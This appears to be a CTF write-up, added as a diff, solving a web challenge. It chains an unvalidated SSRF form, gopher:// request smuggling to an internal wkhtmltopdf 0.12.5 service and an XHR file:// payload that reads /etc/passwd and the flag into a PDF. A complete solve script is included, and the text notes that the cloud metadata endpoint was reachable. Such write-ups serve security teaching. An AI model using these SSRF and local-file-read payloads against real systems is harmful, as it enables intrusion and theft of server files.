@@ -1,0 +1,215 @@
+---
+title: 'SunshineCTF 2026 - Groundhog Day'
+description: 'Reaching an internal wkhtmltopdf service through a commented-out SSRF form, upgrading the GET-only fetch to a POST with gopher://, and reading /flag.txt out of the rendered PDF'
+date: 2026-09-30
+tags: ['writeup', 'web', 'ssrf', 'gopher', 'pdf-generation', 'lfi', 'sunshinectf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+A weather console that only ever renders one forecast. The chain is four links:
+
+1. A **commented-out override form** in the page source takes a `feed=<url>` POST and fetches it server-side. Nothing validates the URL.
+2. The page echoes the fetched body **verbatim** into a `Raw telemetry` block, so the SSRF is a full read primitive rather than a blind one.
+3. That reveals an internal "Bureau Archive" on `127.0.0.1:8000` whose `POST /report` renders HTML to PDF with **wkhtmltopdf 0.12.5**.
+4. The fetcher is pycurl, so **`gopher://`** turns the GET-only SSRF into an arbitrary raw TCP write — a real POST to `/report` — and wkhtmltopdf's JavaScript engine reads `file:///flag.txt` into the PDF.
+
+## Challenge Description
+
+> The Punxsutawney Orbital Weather Authority has been broadcasting the same forecast since 1993.
+>
+> Every reading is fresh. Every date is February 2. The Bureau insists this is fine, and the groundhog has declined to comment.
+>
+> Their public console is up. Have a look at where it gets its numbers.
+
+## Initial Analysis
+
+"Have a look at where it gets its numbers" is the whole hint. The rendered page shows a date card, a shadow verdict and surface conditions, but the interesting part is at the very bottom of the source:
+
+```html
+<!-- ops: console pulls station JSON at boot from http://127.0.0.1:8000/feed.
+     override it with feed=<url> when PUNX-1 is down and you need to point at
+     a spare station. manual override panel below, re-enable it next outage.
+     remove before public launch.
+
+<form class="override" action="/" method="post">
+  <label for="feed">Station feed URL</label>
+  <input id="feed" name="feed" type="text" size="60" value="http://127.0.0.1:8000/feed">
+  <button type="submit">Load station</button>
+</form>
+-->
+<!-- feed-debug: source=http://127.0.0.1:8000/feed bytes=354 -->
+```
+
+The form is commented out in the HTML, which only means the browser will not draw it. The route behind it is still live — commenting out a control does nothing to the handler:
+
+```bash
+curl -s -X POST https://odyssey.web.2026.sunshinectf.games/ \
+     --data-urlencode 'feed=http://example.com/'
+```
+
+That returns the page with `feed-debug: source=http://example.com/ bytes=559`, so arbitrary outbound fetches work immediately.
+
+## The Vulnerability
+
+Two properties make this far stronger than a blind SSRF.
+
+**The debug comment is a size oracle.** Every response carries `bytes=N` for whatever was fetched, so you can probe internal ports and paths without reading a single byte of content. A 404 on the internal service is a constant 207 bytes, which makes path discovery trivial:
+
+```text
+      1045  raw    http://127.0.0.1:8000/
+       352  JSON   http://127.0.0.1:8000/feed
+         3  raw    http://127.0.0.1:8000/health
+       207  raw    http://127.0.0.1:8000/anything-else
+       356  raw    http://127.0.0.1:5000/
+```
+
+**The response body is echoed verbatim.** Feeding it valid JSON renders the fields into the console, but the page also carries a `Raw telemetry` block:
+
+```html
+<p class="diag__label">Raw telemetry</p>
+<pre class="tape">{ ... whatever was fetched ... }</pre>
+```
+
+That `pre` is not JSON-aware. Point the feed at a non-JSON URL and it dumps the raw body, which turns the SSRF into a straightforward read primitive. Fetching the internal root gives up the whole service:
+
+```text
+PUNXSUTAWNEY ORBITAL WEATHER AUTHORITY -- BUREAU ARCHIVE (internal)
+====================================================================
+Staff endpoints. Do not expose to the public console.
+
+  GET  /feed
+       Current randomised observation for station PUNX-1, as JSON.
+
+  GET  /health
+       Liveness probe.
+
+  POST /report
+       Render an archival PDF from a report body.
+       Content-Type: application/x-www-form-urlencoded
+       Fields:
+         content  report contents
+         title    optional document title
+
+       Returns JSON. The microfilm scanner cannot take binary over the
+       wire, so the document comes back base64 in the `data` field.
+
+NOTE(ops): This application is NOT to be published. It has been restricted to
+localhost for maintenance and testing purposes; mainly updating from wkhtmltopdf 0.12.5
+```
+
+The ops note names the renderer, and **wkhtmltopdf 0.12.5** is the version that still runs JavaScript and still allows `file://` access from the rendered document.
+
+## Exploitation
+
+### Turning GET into POST with gopher
+
+`/report` is `POST`-only — a `GET` returns `405 Method Not Allowed`. The feed fetcher only issues GETs, so the request has to be constructed by hand. The fetcher turns out to be **pycurl**, which means it speaks more than HTTP:
+
+```text
+gopher://127.0.0.1:8000/_GET%20/feed%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
+```
+
+That comes back with the full raw HTTP response, headers and all, proving the gopher handler writes arbitrary bytes to an arbitrary TCP port. `dict://` and `file://` are both rejected, but gopher is all that is needed — a POST is just bytes:
+
+```python
+def gopher_post(path, fields, host="127.0.0.1", port=8000):
+    body = urllib.parse.urlencode(fields)
+    req = (f"POST {path} HTTP/1.1\r\n"
+           f"Host: {host}:{port}\r\n"
+           "Content-Type: application/x-www-form-urlencoded\r\n"
+           f"Content-Length: {len(body)}\r\n"
+           "Connection: close\r\n\r\n" + body)
+    return f"gopher://{host}:{port}/_" + urllib.parse.quote(req, safe="")
+```
+
+Sending that through the feed parameter returns the PDF service's JSON, with the document base64 in `data`:
+
+```text
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.8 Python/3.13.7
+Content-Type: application/json
+
+{
+  "document": "archive-feb-02.pdf",
+  "bytes": 8226,
+  "encoding": "base64",
+  "data": "JVBERi0xLjQKMSAwIG9iago8PAovVGl0bGUgKP7/AEIAdQByAGUAYQB1..."
+}
+```
+
+Decoding the PDF header confirms the renderer: `/Creator (wkhtmltopdf 0.12.5)`, `/Producer (Qt 4.8.7)`.
+
+### Reading the file
+
+The obvious payload does not work:
+
+```html
+<iframe src="file:///etc/passwd" width="1200" height="1400"></iframe>
+```
+
+That renders a blank page. Local file access from a remote-loaded document is restricted, and the iframe silently fails. But JavaScript is enabled, and **XHR to `file://` is not blocked**:
+
+```html
+<div id=o>NOXHR</div><script>
+  var x = new XMLHttpRequest();
+  x.open("GET", "file:///etc/passwd", false);
+  x.send();
+  document.getElementById("o").innerText = x.responseText;
+</script>
+```
+
+Rendering that and extracting the PDF text gives `root:x:0:0:root:/root:/bin/sh` — arbitrary file read, in a PDF.
+
+One gotcha: batching several paths into one report breaks the render and the service returns no JSON at all. One path per request is reliable.
+
+```text
+/flag.txt -> sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}
+```
+
+Also reachable and unused: GCP metadata at `http://169.254.169.254/` (it answers `computeMetadata/`), and the app's own source at `/proc/self/cwd/app.py`.
+
+## Solve Script
+
+```python
+import urllib.request, urllib.parse, re, html, json, base64, io
+from pypdf import PdfReader
+
+URL = "https://odyssey.web.2026.sunshinectf.games/"
+
+def tape(feed, timeout=25):
+    """The Raw telemetry <pre> echoes whatever was fetched, verbatim."""
+    d = urllib.parse.urlencode({"feed": feed}).encode()
+    b = urllib.request.urlopen(urllib.request.Request(URL, data=d), timeout=timeout).read().decode()
+    m = re.search(r'<pre class="tape">(.*?)</pre>', b, re.S)
+    return html.unescape(m.group(1)) if m else None
+
+def gopher_post(path, fields, host="127.0.0.1", port=8000):
+    body = urllib.parse.urlencode(fields)
+    req = (f"POST {path} HTTP/1.1\r\n"
+           f"Host: {host}:{port}\r\n"
+           "Content-Type: application/x-www-form-urlencoded\r\n"
+           f"Content-Length: {len(body)}\r\n"
+           "Connection: close\r\n\r\n" + body)
+    return f"gopher://{host}:{port}/_" + urllib.parse.quote(req, safe="")
+
+TPL = """<style>body{font-family:monospace;font-size:8px;white-space:pre-wrap}</style>
+<div id=o>__MISS__</div><script>
+try{ var x=new XMLHttpRequest(); x.open("GET","file://"+%s,false); x.send();
+     document.getElementById("o").innerText=x.responseText; }
+catch(e){ document.getElementById("o").innerText="ERR "+e; }
+</script>"""
+
+def read(path):
+    raw = tape(gopher_post("/report", {"content": TPL % json.dumps(path)}), timeout=60)
+    pdf = base64.b64decode(json.loads(re.search(r"\{.*\}", raw, re.S).group(0))["data"])
+    return "\n".join(p.extract_text() for p in PdfReader(io.BytesIO(pdf)).pages).strip()
+
+print(read("/flag.txt"))
+```
+
+## Flag
+
+```text
+sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}
+```
